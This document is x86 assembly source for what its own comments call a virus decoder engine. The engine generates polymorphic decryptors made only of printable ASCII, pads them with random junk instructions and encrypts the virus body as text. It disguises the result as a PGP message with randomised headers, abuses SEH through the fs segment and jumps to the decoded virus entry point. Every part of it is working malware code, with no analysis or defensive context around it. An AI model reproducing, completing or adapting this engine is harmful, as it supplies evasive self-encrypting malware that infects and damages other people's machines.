
engine_c_start:

; This is main virus decoder, which will be generated & executed by code,
; consisting of 0x21..0x7E characters.

                        align   4
pgp_decoder             dd      ?

                        cld

                        mov     eax, fs:[FS_CONST2]
                        mov     fs:[0], eax

                        mov     eax, fs:[FS_CONST1]
                        neg     eax
                        mov     esp, eax

                        pop     dword ptr fs:[FS_CONST2]
                        pop     dword ptr fs:[FS_CONST1]
                        pop     ebp

                        mov     esi, 12345678h
pgp_base                equ     dword ptr $-4

                        mov     edx, 88888888h
pgp_keycrypt            equ     dword ptr $-4

__1:                    inc     esi

                        pusha

                        call    __decode
                        mov     ecx, eax

                        call    __decode
                        shl     eax, 8
                        or      ecx, eax

                        call    __decode
                        shl     eax, 16
                        or      ecx, eax

                        call    __decode
                        shl     eax, 24
                        or      eax, ecx

                        cmp     eax, VIRUS_ID

                        popa
                        jne     __1

                        mov     edi, esi
                        lea     ebx, pe_entrypoint-start[esi]

                        mov     ecx, virsize

__2:                    call    __decode
                        stosb

                        loop    __2

                        jmp     ebx

__decode:               lodsw
                        cmp     ax, 0A0Dh
                        je      __decode

                        sub     ax, PGP_ICHAR
                        aad     16

                        add     al, dh
                        xor     al, dl

                        mov     ah, al

                        call    fuck_edx

                        movzx   eax, al

                        ret

   ; input:  edx,ah
   ; output: edx

fuck_edx:               sub     dh, ah
                        adc     edx, 12345678h
pgp_key2                equ     dword ptr $-4
                        ror     edx, 11
                        jp      __x
                        xor     dh, dl
__x:                    ret

                        align   4
pgp_decodebit_size      equ     $-pgp_decoder

; This is main subprogram of engine.
; It generates code consisting of 0x21..0x7E characters.

create_decryptor:       pusha

                        call    get_base_ebp
                        cld

                        ;;

                        mov     eax, pgp_data_va[ebp]
                        add     eax, 4
                        mov     pgp_decoder[ebp], eax

                        call    random_eax
                        mov     pgp_keycrypt[ebp], eax

                        call    random_eax
                        mov     pgp_key2[ebp], eax

                        ;;

                        lea     edi, pgp_buf[ebp]

                        push    edi
                        mov     ecx, PGP_BUF_MAX_SIZE/4
                        xor     eax, eax
                        rep     stosd
                        pop     edi

                        ; crlf
                        call    direct_crlf
                        call    direct_crlf

                        ; pgp_hdr_num = rnd(pgp_hdr_max)
                        mov     eax, pgp_hdr_max
                        call    rnd_eax
                        mov     pgp_hdr_num[ebp], eax

                        cmp     eax, pgp_hdr_maxkey
                        jnb     __skip_keyi

                        call    random_eax
                        jp      __skip_keyi

                        ; init key info
                        lea     esi, pgp_text1a[ebp]
                        lea     ebx, pgp_text1b[ebp]
                        call    copy_asciiz

                        mov     eax, pgp_gopnik_max
                        call    rnd_eax
                        mov     esi, pgp_gopnik_offs[eax*4][ebp]
                        add     esi, ebp
                        call    copy_asciiz

                        call    direct_crlf
                        call    direct_crlf

__skip_keyi:

                        ; store init msg
                        mov     eax, pgp_hdr_num[ebp]
                        mov     esi, pgp_hdr_offs[eax*8+0][ebp]
                        add     esi, ebp
                        call    copy_asciiz

                        ; eax = rnd(pgp_ver_max)
                        mov     eax, pgp_ver_max
                        call    rnd_eax

                        ; store version msg
                        mov     esi, pgp_ver_offs[eax*4][ebp]
                        add     esi, ebp
                        call    copy_asciiz

                        ; eax = rnd(pgp_ver_max)
                        mov     eax, pgp_cmt_max
                        call    rnd_eax

                        ; store comment msg
                        mov     esi, pgp_cmt_offs[eax*4][ebp]
                        add     esi, ebp
                        call    copy_asciiz

                        ; crlf
                        call    direct_crlf

                        ; number of characters in current line
                        mov     pgp_linecount[ebp], 0

                        ; init sign
                        lea     esi, pgp_keyinit[ebp]
                        call    copy_asciiz

                        ; random chars
                        call    store_random

                        ; save eip
                        lea     eax, pgp_buf[ebp]
                        sub     eax, edi
                        neg     eax
                        mov     pgp_buf_eip[ebp], eax

                        ; init regused
                        mov     pgp_regused[ebp], bit_esp+bit_ebp+bit_stack

;                       mov     al, 0CCh
;                       call    pgp_stosb

                        call    out_trash_random

                        _use    bit_eax
                        xor     eax, eax
                        call    mov_eax

                        call    out_trash_random

                        call    mov_esi_0
                        call    push_ebp
                        call    push_fs1
                        call    push_fs2
                        call    mov_fs1_esp
                        call    mov_ecx_encrdata

                        mov     ecx, pgp_decodebit_size/4
__cycle:

                        call    out_trash_random

                        call    random_ax
                        and     al, 1
                        xchg    edx, eax

                        mov     eax, pgp_decoder[ebp][ecx*4-4]

                        test    dl, 1
                        jz      __1
                        neg     eax
__1:
                        call    mov_eax

                        call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_eax ; push eax
                        call    pgp_stosb
                        _free   bit_eax

                        call    out_trash_random

                        _use    bit_edi
                        mov     al, 58h+reg_edi ; pop edi
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        mov     ax, 3121h       ; and [ecx], esi
                        call    pgp_stosw

                        call    out_trash_random

                        mov     ax, 3931h       ; xor [ecx], edi
                        test    dl, 1
                        jz      __2
                        mov     ax, 3929h       ; sub [ecx], edi
__2:
                        call    pgp_stosw
                        _free   bit_edi

                        call    out_trash_random

                        mov     edx, 4

__3:                    mov     al, 48h+reg_ecx   ; dec ecx
                        call    pgp_stosb

                        call    out_trash_random

                        dec     edx
                        jnz     __3

                        call    out_trash_random

                        dec     ecx
                        jg      __cycle

                        _free   bit_edi+bit_ecx

;                       mov     al, 0CCh
;                       call    pgp_stosb

                        call    sub_edi_fs0
                        call    sub_fs2_edi
                        call    mov_fs0_seh

;                       mov     al, 0CCh
;                       call    pgp_stosb

                        mov     eax, 39292Eh      ; sub cs:[ecx], edi
                        call    pgp_stos3

                        _free   bit_all

                        call    out_trash_random
                        call    out_trash_random

                        ; random chars
                        call    store_random

                        ; code

                        lea     esi, start[ebp]

                        mov     ecx, virsize

                        mov     edx, pgp_keycrypt[ebp]

__7:                    lodsb
                        mov     ah, al

                        xor     al, dl
                        sub     al, dh

                        call    fuck_edx

                        aam     16
                        add     ax, PGP_ICHAR

                        stosw
                        add     pgp_linecount[ebp], 2

                        cmp     pgp_linecount[ebp], 64
                        jb      __8
                        mov     ax, 0A0Dh
                        stosw
                        mov     pgp_linecount[ebp], 0
__8:
                        loop    __7


                        ; random chars
                        call    store_random

                        ; done sign
                        lea     esi, pgp_keydone[ebp]
                        call    copy_asciiz

                        ; random dword
                        call    random_ax_pgp
                        stosw
                        call    random_ax_pgp
                        stosw

                        ; crlf
                        call    direct_crlf

                        ; done msg
                        mov     eax, pgp_hdr_num[ebp]
                        mov     esi, pgp_hdr_offs[eax*8+4][ebp]
                        add     esi, ebp
                        call    copy_asciiz

                        ; calc buf_size
                        sub     edi, offset pgp_buf
                        sub     edi, ebp
                        mov     pgp_buf_size[ebp], edi

                        popa
                        ret

mov_esi_0:              call    out_trash_random

                        mov     al, 50h+reg_eax ; push eax
                        call    pgp_stosb
                        _free   bit_eax

                        call    out_trash_random

                        _use    bit_esi
                        mov     al, 58h+reg_esi ; pop esi
                        call    pgp_stosb

                        call    out_trash_random

                        ret

mov_ecx_encrdata:       call    out_trash_random

                        mov     eax, pgp_data_va[ebp]
                        add     eax, pgp_decodebit_size-4
                        call    mov_eax

                        call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_eax ; push eax
                        call    pgp_stosb
                        _free   bit_eax

                        call    out_trash_random

                        _use    bit_ecx
                        mov     al, 58h+reg_ecx ; pop ecx
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        ret


sub_edi_fs0:            call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_esi  ; push esi
                        call    pgp_stosb

                        call    out_trash_random

                        _use    bit_ecx
                        mov     al, 58h+reg_ecx  ; pop ecx
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_esi  ; push esi
                        call    pgp_stosb

                        call    out_trash_random

                        _use    bit_edi
                        mov     al, 58h+reg_edi  ; pop edi
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        mov     eax, 392B64h    ; sub edi, fs:[ecx]
                        call    pgp_stos3

                        call    out_trash_random

                        ret


push_fs1:               mov     eax, FS_CONST1
                        call    push_fsx
                        ret

push_fs2:               mov     eax, FS_CONST2
                        call    push_fsx
                        ret

push_fsx:               call    out_trash_random

                        call    mov_eax

                        mov     al, 50h+reg_eax  ; push eax
                        call    pgp_stosb

                        call    out_trash_random

                        _use    bit_ecx
                        mov     al, 58h+reg_ecx  ; pop ecx
                        call    pgp_stosb

                        call    out_trash_random

                        mov     al, 50h+reg_esi  ; push esi
                        call    pgp_stosb

                        call    out_trash_random

                        _use    bit_edi
                        mov     al, 58h+reg_edi  ; pop edi
                        call    pgp_stosb

                        call    out_trash_random

                        mov     eax, 392B64h    ; sub edi, fs:[ecx]
                        call    pgp_stos3

                        call    out_trash_random
                        call    out_trash_random

                        mov     al, 50h+reg_edi  ; push edi
                        call    pgp_stosb
                        _free   bit_edi

                        ret


sub_fs2_edi:            call    out_trash_random

                        mov     eax, FS_CONST2
                        call    mov_eax

                        call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_eax  ; push eax
                        call    pgp_stosb
                        _free   bit_eax

                        call    out_trash_random

                        _use    bit_ecx
                        mov     al, 58h+reg_ecx  ; pop ecx
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        mov     eax, 312164h   ; and fs:[ecx], esi
                        call    pgp_stos3

                        call    out_trash_random

                        mov     eax, 392964h   ; sub fs:[ecx], edi
                        call    pgp_stos3
                        _free   bit_edi

                        call    out_trash_random

                        ret

mov_fs1_esp:            call    out_trash_random

                        mov     eax, FS_CONST1
                        call    mov_eax

                        call    out_trash_random

                        mov     al, 50h+reg_eax  ; push eax
                        call    pgp_stosb
                        _free   bit_eax

                        call    out_trash_random

                        _use    bit_ecx
                        mov     al, 58h+reg_ecx  ; pop ecx
                        call    pgp_stosb

                        call    out_trash_random

                        mov     eax, 312164h   ; and fs:[ecx], esi
                        call    pgp_stos3

                        call    out_trash_random

                        mov     al, 50h+reg_esp  ; push esp
                        call    pgp_stosb

                        call    out_trash_random

                        _use    bit_edi
                        mov     al, 58h+reg_edi  ; pop edi
                        call    pgp_stosb

                        _free   bit_stack

                        call    out_trash_random

                        mov     eax, 392964h   ; sub fs:[ecx], edi
                        call    pgp_stos3
                        _free   bit_ecx+bit_edi

                        call    out_trash_random

                        ret

push_ebp:               call    out_trash_random

                        mov     al, 50h+reg_ebp         ; push ebp
                        call    pgp_stosb
                        _free   bit_ebp

                        call    out_trash_random

                        ret

mov_fs0_seh:            call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_esi  ; push esi
                        call    pgp_stosb

                        call    out_trash_random

                        mov     al, 58h+reg_ecx  ; pop ecx
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        mov     eax, pgp_data_va[ebp]
                        sub     eax, 4
                        neg     eax
                        call    mov_eax

                        call    out_trash_random

                        _use    bit_stack
                        mov     al, 50h+reg_eax    ; push eax
                        call    pgp_stosb
                        _free   bit_eax

                        call    out_trash_random

                        _use    bit_edi
                        mov     al, 58h+reg_edi    ; pop edi
                        call    pgp_stosb
                        _free   bit_stack

                        call    out_trash_random

                        mov     eax, 312164h    ; and fs:[ecx], esi
                        call    pgp_stos3

                        call    out_trash_random

                        mov     eax, 392964h    ; sub fs:[ecx], edi
                        call    pgp_stos3

                        _free   bit_ecx+bit_edi

                        call    out_trash_random

                        ret


store_random:           mov     eax, 20h
                        mov     ecx, eax
                        call    rnd_eax
                        add     ecx, eax

__cycle:                call    random_ax_pgp
                        call    pgp_stosb
                        loop    __cycle

                        ret

copy_asciiz:            pusha

__cycle:                lodsb
                        or      al, al
                        jz      __exit
                        cmp     al, '%'
                        je      __percent
                        stosb
                        inc     pgp_linecount[ebp]
                        jmp     __cycle

__exit:                 mov     [esp].pushad_edi, edi
                        popa
                        ret

__percent:              push    esi

                        mov     eax, [ebx+4*0]
                        call    rnd_eax
                        imul    eax, [ebx+4*1]
                        add     eax, [ebx+4*2]

                        mov     ecx, [ebx+4*3]
                        mov     esi, [ebx+4*4]

__1:                    xor     edx, edx
                        div     esi
                        push    edx
                        loop    __1

                        mov     ecx, [ebx+4*3]

__2:                    pop     eax
                        aam     10
                        aad     17
                        add     al, '0'
                        stosb
                        inc     pgp_linecount[ebp]
                        loop    __2

                        add     ebx, 5*4

                        pop     esi
                        jmp     __cycle

mov_ax:                 pusha

                        xchg    esi, eax

                        call    random_ax_pgp
                        xchg    ebx, eax
                        call    random_ax_pgp
                        xchg    ecx, eax

                        jmp     __4

__0:                    mov     bl, 21h
__1:                    mov     bh, 21h
__2:                    mov     cl, 21h
__3:                    mov     ch, 21h

__4:

                        mov     edx, ebx
                        sub     dx, cx
                        xor     edx, esi

                        cmp     dl, 21h
                        jb      __sux
                        cmp     dl, 7Eh
                        ja      __sux
                        cmp     dh, 21h
                        jb      __sux
                        cmp     dh, 7Eh
                        ja      __sux

                        call    out_trash_random

                        push    pgp_regused[ebp]
                        _use    bit_stack

                        shrd    eax,ebx,16
                        mov     ax, 6866h       ; push xxxx
                        call    pgp_stosd

                        call    out_trash_random

                        _use    bit_eax
                        mov     ax, 5866h       ; pop ax
                        call    pgp_stosw

                        pop     pgp_regused[ebp]
                        _use    bit_eax

                        call    out_trash_random

                        shrd    eax,ecx,16
                        mov     ax, 2D66h       ; sub     ax, xxxx
                        call    pgp_stosd

                        call    out_trash_random

                        shrd    eax,edx,16
                        mov     ax, 3566h       ; xor     ax, xxxx
                        call    pgp_stosd

                        call    out_trash_random

                        jmp     __ret

__sux:                  inc     ch
                        cmp     ch, 7Eh
                        jbe     __4

                        inc     cl
                        cmp     cl, 7Eh
                        jbe     __3

                        inc     bh
                        cmp     bh, 7Eh
                        jbe     __2

                        inc     bl
                        cmp     bl, 7Eh
                        jbe     __1

                        call    random_ax_pgp

                        push    eax
                        add     eax, esi
                        call    mov_ax
                        pop     eax

                        shl     eax, 16
                        mov     ax, 2D66h       ; sub     ax, xxxx
                        call    pgp_stosd

__ret:                  mov     [esp].pushad_edi, edi
                        popa

                        ret

mov_eax:
                        call    out_trash_random

                        rol     eax, 16
                        call    mov_ax

                        push    eax

                        call    out_trash_random

                        push    pgp_regused[ebp]
                        _use    bit_stack

                        mov     ax, 5066h       ; push ax
                        call    pgp_stosw
                        _free   bit_eax

                        call    out_trash_random

                        call    random_ax
                        and     ax, 0700h
                        or      ax, 5066h       ; push ?
                        call    pgp_stosw

                        call    out_trash_random

                        _use    bit_eax
                        mov     al, 58h+reg_eax   ; pop eax
                        call    pgp_stosb

                        pop     pgp_regused[ebp]
                        _use    bit_eax

                        call    out_trash_random

                        pop     eax

                        rol     eax, 16
                        call    mov_ax

                        call    out_trash_random

                        ret

pgp_stosb:              stosb
                        inc     pgp_linecount[ebp]
                        jmp     check_crlf

pgp_stos3:              stosd
                        dec     edi
                        add     pgp_linecount[ebp], 3
                        jmp     check_crlf

pgp_stosw:              stosw
                        add     pgp_linecount[ebp], 2
                        jmp     check_crlf

pgp_stosd:              stosd
                        add     pgp_linecount[ebp], 4
                        jmp     check_crlf

check_crlf:             pusha

                        mov     ecx, pgp_linecount[ebp]

                        cmp     ecx, 64-2-6
                        jb      __exit
                        sub     ecx, 64-2
                        neg     ecx

                        jle     __skip

__cycle:                call    out_trash_nocheck
                        loop    __cycle

__skip:

                        call    out_crlf

__exit:                 mov     [esp].pushad_edi, edi
                        popa
                        ret

direct_crlf:            mov     ax, 0A0Dh
                        stosw
                        ret

out_crlf:               push    eax

                        test    pgp_regused[ebp], bit_eax
                        jnz     __used

__notused:
                        call    out_trash_nocheck
                        call    out_trash_nocheck

                        call    direct_crlf     ; 0D 0A   or ax, zzyyxx0A
                        call    random_ax_pgp
                        stosw
                        call    random_ax_pgp
                        stosb

                        mov     pgp_linecount[ebp], 3

                        jmp     __exit

__used:                 mov     eax, 0A0D6866h  ; push word xxxx
                        stosd

                        mov     pgp_linecount[ebp], 0

                        test    pgp_regused[ebp], bit_stack
                        jz      __skip_pop

                        mov     al, 66h
                        stosb
__nxt:                  call    random_ax       ; pop xxxx
                        and     eax, 7
                        bt      pgp_regused[ebp], eax
                        jc      __nxt
                        or      al, 58h
                        stosb
                        add     pgp_linecount[ebp], 2

__skip_pop:

__exit:                 pop     eax
                        ret

out_trash_random:       push    eax
                        call    random_eax
                        pop     eax
                        jp      out_trash
                        ret

out_trash:              call    out_trash_nocheck
                        jmp     check_crlf

out_trash_nocheck:      pusha


;                       mov     al, 90h
;                       jmp     __stosb


__cycle:                call    random_ax
                        and     eax, 7

                        bt      pgp_regused[ebp], eax
                        jc      __cycle

                        xchg    ebx, eax


                        mov     eax, 3      ; 40 48 50

                        test    pgp_regused[ebp], bit_stack
                        jz      __ok
                        dec     eax         ; 40 48
__ok:
                        call    rnd_eax
                        shl     al, 3
                        add     al, 40h


                        add     al, bl

__stosb:                stosb
                        inc     pgp_linecount[ebp]

                        mov     [esp].pushad_edi, edi
                        popa
                        ret

engine_c_size           equ     $-engine_c_start
